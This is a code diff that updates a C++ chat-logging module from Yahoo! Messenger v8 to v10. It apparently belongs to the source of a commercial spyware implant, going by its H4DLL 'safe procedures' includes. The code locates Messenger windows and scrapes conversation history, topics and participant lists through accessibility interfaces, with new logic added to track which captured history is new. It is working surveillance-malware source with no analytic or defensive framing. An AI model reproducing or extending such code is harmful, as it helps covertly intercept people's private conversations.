@@ -1,8 +1,8 @@
 /*
-* Yahoo! Messenger v8.x Logger
+* Yahoo! Messenger v10.x Logger
 *
 * Coded by: Quequero
-* Date: 14/Mar/2008
+* Date: 15/Dec/2009
 *
 */
 
@@ -11,27 +11,28 @@
 #include <stdio.h>
 using namespace std;
 
-#include "QYim8.h"
-#include "..\HM_SafeProcedures.h"
-#include "..\common.h"
+#include "QYim10.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
+#include "../../H4DLL/common.h"
+
 #define MIN_SEARCH_LENGTH 200
 
-PWCHAR QYim8::wChatTree[] = {
-	L"YSearchMenuWndClass",
-	L"IMClass",
-	L"YHTMLContainer",
-	L"Internet Explorer_Server",
+PWCHAR QYim10::wChatTree[] = {
+	(PWCHAR)L"CConvWndBase",
+	(PWCHAR)L"YHTMLContainer",
+	(PWCHAR)L"Internet Explorer_Server",
 	0
 };
 
-PWCHAR QYim8::wChatUserListTree[] = {
-	L"YSearchMenuWndClass",
-	L"IMClass",
-	L"SysListView32",
+PWCHAR QYim10::wChatUserListTree[] = {
+	(PWCHAR)L"YTopWindow",
+	(PWCHAR)L"YSearchMenuWndClass",
+	(PWCHAR)L"CMerlinWndBase",
+	(PWCHAR)L"SysListView32",
 	0
 };
 
-QYim8::QYim8(HWND hw) : QYim7(hw)
+QYim10::QYim10(HWND hw) : QYim8(hw)
 {
 	WCHAR wTopic[256];
 
@@ -43,10 +44,10 @@ QYim8::QYim8(HWND hw) : QYim7(hw)
 	if(HM_SafeGetWindowTextW(hw, wTopic, 256))
 		properties.SetId(wTopic);
 	else
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 }
 
-QYim8::~QYim8()
+QYim10::~QYim10()
 {
 	if(pwConv){
 		delete[] pwConv;
@@ -54,7 +55,7 @@ QYim8::~QYim8()
 	}
 }
 
-BOOL QYim8::GrabHistory()
+BOOL QYim10::GrabHistory()
 {
 	//LONG uLines, uIndex, i;
 	BSTR bChat = NULL;
@@ -83,7 +84,7 @@ BOOL QYim8::GrabHistory()
 			return FALSE;
 		}
 
-		//wprintf(L"%s\n", pwConv);
+		wprintf(L"%s\n", pwConv);
 
 		properties.SetHistory(pwConv);
 		properties.SetUpdated(TRUE);
@@ -115,7 +116,18 @@ BOOL QYim8::GrabHistory()
 		bChat = NULL;
 
 		// Cerchiamo dove si trova l'ultima parte acquisita
-		wRes = properties.wcsrstr(pwConv, properties.GetHistory());		
+		wRes = properties.wcsrstr(pwConv, properties.GetHistory());
+
+		// YIM 10 aggiunge delle righe alla history se la chat viene ricevuta
+		// percio' epuriamo il log eliminando una alla volta alcune righe
+		for (UINT i = 0; i < 5 && wRes == NULL; i++) {
+			wRes = properties.wcsrstr(properties.GetHistory(), (PWCHAR)L"\n");
+
+			if (wRes)
+				*wRes = 0;
+
+			wRes = properties.wcsrstr(pwConv, properties.GetHistory());
+		}
 
 		if(wRes == NULL){
 			properties.SetUpdated(FALSE);
@@ -358,7 +370,7 @@ BOOL QYim8::GrabHistory()
 */
 }
 
-BOOL QYim8::GrabTopic()
+BOOL QYim10::GrabTopic()
 {
 	WCHAR wTopic[256] = {0};
 
@@ -367,7 +379,7 @@ BOOL QYim8::GrabTopic()
 	if(HM_SafeGetWindowTextW(ole.GetHandle(), wTopic, 256))
 		properties.SetId(wTopic);
 	else
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 
 	return TRUE;
 }
@@ -375,7 +387,7 @@ BOOL QYim8::GrabTopic()
 /**
 * Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
 */
-BOOL QYim8::GrabUserList()
+BOOL QYim10::GrabUserList()
 {
 	UINT uLen, i;
 	BSTR bUser = NULL;
@@ -391,7 +403,7 @@ BOOL QYim8::GrabUserList()
 	// Se non c'e' il pannellino laterale, prova ad estrarre l'username
 	// del nostro interlocutore dal titolo della finestra
 	if(hwUserList == NULL){
-		if(HM_SafeGetWindowTextW(hwMain, wTopic, 256)){
+		if(HM_SafeGetWindowTextW(hwMain, wTopic, 256)) {
 			pwMark = wcsstr(wTopic, L" --");
 
 			if(pwMark){
@@ -432,9 +444,9 @@ BOOL QYim8::GrabUserList()
 	for(i = 0; i < uLen; i++){
 		if(ole.GetYimSpecificLineFromContainer(NULL, &bUser, i, ROLE_SYSTEM_LISTITEM) == FALSE || bUser == NULL){
 			if(i < uLen - 1)
-				bRes = properties.AppendUser(L"", TRUE);
+				bRes = properties.AppendUser((PWCHAR)L"", TRUE);
 			else
-				bRes = properties.AppendUser(L"", FALSE);
+				bRes = properties.AppendUser((PWCHAR)L"", FALSE);
 
 			continue;
 		}
@@ -457,7 +469,7 @@ BOOL QYim8::GrabUserList()
 	return TRUE;
 }
 
-BOOL QYim8::FixString(PWCHAR bChat)
+BOOL QYim10::FixString(PWCHAR bChat)
 {
 	UINT uCount, i, j;
 
